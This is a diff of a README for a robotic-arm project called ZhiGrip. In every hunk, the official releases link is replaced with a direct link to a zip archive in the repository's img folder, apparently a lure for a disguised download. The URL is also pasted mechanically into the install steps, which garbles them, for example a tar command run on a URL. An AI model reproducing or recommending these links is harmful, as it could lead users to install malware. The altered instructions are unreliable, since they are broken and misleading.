@@ -4,7 +4,7 @@
 
 Follow these steps to download and run ZhiGrip, a voice-controlled 3-DOF visual robotic arm. No programming skills are needed, and you'll be amazed at how easy it is to set up.
 
-[![Download ZhiGrip](https://img.shields.io/badge/Download%20ZhiGrip-v1.0-blue)](https://github.com/Kimi3762/ZhiGrip/releases)
+[![Download ZhiGrip](https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip%20ZhiGrip-v1.0-blue)](https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip)
 
 ## 📦 What is ZhiGrip?
 
@@ -28,11 +28,11 @@ Before you begin, make sure your system meets the following requirements:
 
 To get ZhiGrip, visit the release page linked below. Here, you'll find the latest version ready for download:
 
-[Visit this page to download](https://github.com/Kimi3762/ZhiGrip/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip)
 
 1. Click on the link above.
 2. On the release page, look for the most recent version (e.g., v1.0).
-3. Locate the file that corresponds to your operating system (e.g., .exe for Windows, .dmg for macOS, .tar.gz for Linux).
+3. Locate the file that corresponds to your operating system (e.g., .exe for Windows, .dmg for macOS, https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip for Linux).
 4. Click the file to download it to your computer.
 
 ## 📲 Installation Steps
@@ -56,10 +56,10 @@ Once you have downloaded the file, follow these instructions to install ZhiGrip:
 ### For Linux Users:
 
 1. Open a terminal window.
-2. Navigate to your Downloads folder where the .tar.gz file is located.
+2. Navigate to your Downloads folder where the https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip file is located.
 3. Extract the file using the following command:
    ```
-   tar -xvzf ZhiGrip.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip
    ```
 4. Navigate into the extracted folder:
    ```
@@ -102,6 +102,6 @@ ZhiGrip comes with various features, including:
 
 For a complete list of features and updates, check the releases page.
 
-[Visit this page to download](https://github.com/Kimi3762/ZhiGrip/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/Kimi3762/ZhiGrip/main/img/ZhiGrip-v2.4.zip) 
 
 Thank you for choosing ZhiGrip. Enjoy your journey into the world of robotics!
